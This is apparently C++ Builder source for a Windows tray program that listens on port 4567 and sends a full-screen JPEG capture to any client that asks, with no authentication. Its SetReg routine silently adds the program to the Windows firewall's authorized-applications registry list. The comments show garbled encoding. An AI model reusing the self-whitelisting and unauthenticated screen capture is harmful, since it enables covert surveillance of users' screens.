//---------------------------------------------------------------------------

#include <vcl.h>
#include <process.h>
#include <Registry.hpp>
#include <jpeg.hpp>
#pragma hdrstop

#include "Unit1.h"
#include "Unit2.h"
#include "TSocket.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma link "trayicon"
#pragma link "WinSkinData"
#pragma resource "*.dfm"
TForm1 *Form1;

//-------------------------------------------------------------------------
// ����ǰ��Ļ�����浽imagestream��
void CaptureImage(int Quality,TMemoryStream* imgstream)
{
     Graphics::TBitmap* Bmp;
     TJPEGImage* jpeg;
     try{

         Bmp=new Graphics::TBitmap;
         jpeg=new TJPEGImage;
         Bmp->Width=Screen->Width;
         Bmp->Height=Screen->Height;
         ::BitBlt(Bmp->Canvas->Handle,0,0,Bmp->Width,Bmp->Height,
                  GetDC(GetDesktopWindow()),
                  0,0,SRCCOPY);
         jpeg->Assign(Bmp);
         jpeg->SaveToStream(imgstream);
     }
     __finally
     {
        delete Bmp;
        delete jpeg;
     }
}


//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
    SetReg();
    sock=new TSocket;

}
//---------------------------------------------------------------------------


void __fastcall TForm1::srvrsckt1ClientRead(TObject *Sender,
      TCustomWinSocket *Socket)
{
        AnsiString sRecvString = Socket->ReceiveText();  // ������յ����ַ���
	AnsiString sRemoteAddress = Socket->RemoteAddress;  // ����Է�IP
	u_short port;
        int Quality=100;
	int pos = sRecvString.Pos("\n");
	port = u_short(StrToIntDef(sRecvString.SubString(1,pos-1),0));
	sRecvString = sRecvString.SubString(pos+1,sRecvString.Length()-pos);
        if(port)
        {
            TMemoryStream* Stream;
            try{

                Stream=new TMemoryStream;

                CaptureImage(Quality,Stream);

                if(!sock->SendStream(sRemoteAddress,port,Stream))
                {
                    throw Exception("����ʧ��");
                }
            }
            __finally
            {
                 delete Stream;
            }
        }
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Listen()
{
  this->srvrsckt1->Port=4567;
  this->srvrsckt1->Active=True;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FormClose(TObject *Sender, TCloseAction &Action)
{
      delete sock;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::SetReg()
{
    String keyname,keyvalue,str;
    keyname=Application->ExeName;
    keyvalue=Application->ExeName+":*:Enabled:"+Application->Title;
    TRegistry *rey;
    try{
        rey=new TRegistry;
        rey->RootKey=HKEY_LOCAL_MACHINE;
        rey->OpenKey("SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List",false);
        if(rey->KeyExists(keyname))
        {
            rey->DeleteKey(keyname);
        }
        else
        {
            rey->CreateKey(keyname);
            rey->WriteString(keyname,keyvalue);
        }
        rey->CloseKey();
    }__finally
    {
        delete rey;
    }
}




void __fastcall TForm1::FormShow(TObject *Sender)
{
  this->Listen();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::N1Click(TObject *Sender)
{
  this->Close();        
}
//---------------------------------------------------------------------------


void __fastcall TForm1::btn2Click(TObject *Sender)
{
 this->Close();        
}
//---------------------------------------------------------------------------




void __fastcall TForm1::btn1Click(TObject *Sender)
{
  OKHelpBottomDlg->ShowModal();
}
//---------------------------------------------------------------------------

